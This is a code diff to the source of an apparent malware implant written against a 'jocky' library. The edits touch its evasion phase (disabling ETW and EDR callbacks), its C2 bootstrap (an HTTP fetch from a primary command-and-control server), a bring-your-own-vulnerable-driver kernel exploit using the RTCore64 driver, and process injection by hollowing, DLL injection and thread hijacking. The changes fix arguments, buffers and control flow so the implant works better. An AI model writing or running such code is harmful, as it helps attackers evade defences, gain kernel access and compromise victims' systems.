@@ -62,14 +62,13 @@ fn phase_evasion() -> bool {
     }
 
     // ETW Disabling
-    let etw_disabled = jocky_disable_etw("")
+    let etw_disabled = jocky_disable_etw(null)
     if etw_disabled {
         println("    [+] ETW disabled")
     }
 
-    // EDR Callback Disabling
-    let edr_result = jocky_disable_edr_callbacks("")
-    if edr_result != 0 {
+    // EDR Callback Disabling (return i32, 0=failed, 1=success)
+    if jocky_disable_edr_callbacks(null) != 0 {
         println("    [+] EDR callbacks disabled")
         edr_disabled = true
     }
@@ -137,8 +136,9 @@ fn phase_evasion() -> bool {
 fn phase_c2_bootstrap() -> bool {
     println("[*] Phase 1: C2 Bootstrap")
 
-    let config = jocky_http_get(C2_PRIMARY, "", 4096)
-    if config != 0 {
+    let buf = malloc(4096)
+    let config = jocky_http_get(C2_PRIMARY, buf, 4096)
+    if config > 0 {
         println("    [+] PRIMARY C2 responded")
         return true
     }
@@ -147,6 +147,7 @@ fn phase_c2_bootstrap() -> bool {
     cdn_token = "Bearer_windows_production_v4"
     model_path = LOCAL_MODEL_PATH
     println("")
+    free(buf)
     return true
 }
 
@@ -308,16 +309,14 @@ fn phase_kernel_exploit() -> bool {
         // Note: JOCKY tuple access uses pattern matching
         // For now, using workaround with direct iteration
         let ctx = jocky_byovd_new()
-        if ctx != 0 {
-            // Simplified: just try to load drivers
-            if jocky_byovd_load("rtkiow10x64.sys", "\\\\.\\RTCore64", ctx) {
-                println("    [+] BYOVD driver loaded - kernel access obtained")
-                kernel_access = true
-                jocky_byovd_destroy(ctx)
-                return true
-            }
+        // Simplified: just try to load drivers
+        if jocky_byovd_load("rtkiow10x64.sys", "\\\\.\\RTCore64", ctx) {
+            println("    [+] BYOVD driver loaded - kernel access obtained")
+            kernel_access = true
             jocky_byovd_destroy(ctx)
+            return true
         }
+        jocky_byovd_destroy(ctx)
     }
 
     println("[-] BYOVD chain exhausted (non-critical)")
@@ -330,17 +329,17 @@ fn phase_injection() -> bool {
     println("[*] Phase 8: Process Injection (3 Methods)")
 
     // Process Hollowing
-    if jocky_process_hollow("C:\\Windows\\System32\\notepad.exe", model_path, 0) {
+    if jocky_process_hollow("C:\\Windows\\System32\\notepad.exe", null, 0) {
         println("    [+] Process hollowing successful")
     }
 
     // DLL Injection
-    if jocky_rdll_inject(1234, model_path, 0) {
+    if jocky_rdll_inject(1234, null, 0) {
         println("    [+] DLL injection successful")
     }
 
     // Thread Hijacking
-    if jocky_thread_hijack(1234, model_path, 0) {
+    if jocky_thread_hijack(1234, null, 0) {
         println("    [+] Thread hijacking successful")
     }
 
